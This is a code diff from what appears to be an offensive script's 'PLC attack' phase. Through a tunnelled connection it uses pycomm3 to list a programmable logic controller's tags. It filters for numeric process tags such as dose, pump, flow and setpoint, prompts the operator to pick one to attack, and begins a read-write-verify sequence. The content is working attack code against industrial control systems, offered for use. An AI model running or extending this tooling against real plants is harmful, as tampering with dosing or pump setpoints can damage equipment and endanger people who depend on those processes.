@@ -1132,7 +1132,53 @@ def phase5_plc_attack() -> PhaseResult:
         from pycomm3 import LogixDriver
         info(f"Connecting pycomm3 → 127.0.0.1:{LOCAL_PORT}  (tunnelled to {plc_ip})")
 
+        INTERESTING = {"dose", "rate", "pump", "speed", "flow", "setpoint", "cmd", "hz"}
+        NUMERIC_TYPES = {"REAL", "DINT", "INT", "LINT", "SINT", "UDINT", "UINT"}
+
         with LogixDriver("127.0.0.1") as plc_conn:
+
+            # ── Tag enumeration ───────────────────────────────────────────────
+            info("Enumerating PLC tag list...")
+            all_tags = plc_conn.get_tag_list()
+
+            filtered = [
+                t for t in all_tags
+                if any(kw in t.tag_name.lower() for kw in INTERESTING)
+                and str(t.data_type).upper() in NUMERIC_TYPES
+            ]
+
+            tag_table = Table(
+                title="[bold magenta]Discovered PLC Tags (Filtered)[/bold magenta]",
+                show_header=True, header_style="bold cyan", border_style="dim",
+            )
+            tag_table.add_column("Tag Name",  style="green",  width=36)
+            tag_table.add_column("Data Type", style="yellow", width=12)
+            for t in filtered:
+                tag_table.add_row(t.tag_name, str(t.data_type))
+            console.print(tag_table)
+
+            if not filtered:
+                warn("No interesting tags matched the filter — all tags:")
+                all_table = Table(show_header=True, header_style="bold cyan",
+                                  border_style="dim")
+                all_table.add_column("Tag Name",  style="dim green",  width=36)
+                all_table.add_column("Data Type", style="dim yellow", width=12)
+                for t in all_tags[:40]:   # cap at 40 to avoid wall of text
+                    all_table.add_row(t.tag_name, str(t.data_type))
+                console.print(all_table)
+
+            # ── Validate configured tag; prompt if missing ────────────────────
+            probe = plc_conn.read(tag)
+            if probe is None or probe.value is None:
+                warn(f"Configured tag '{tag}' returned None — it may not exist on this PLC.")
+                console.print()
+                tag = Prompt.ask(
+                    "[yellow]Enter the correct tag name from the table above to attack[/yellow]"
+                )
+                CFG["plc"]["tag"] = tag
+                ok(f"Tag updated → [bold]{tag}[/bold]")
+
+            # ── Read → Write → Verify ─────────────────────────────────────────
             before = plc_conn.read(tag)
             info(f"Before: {tag} = {before.value}")
 
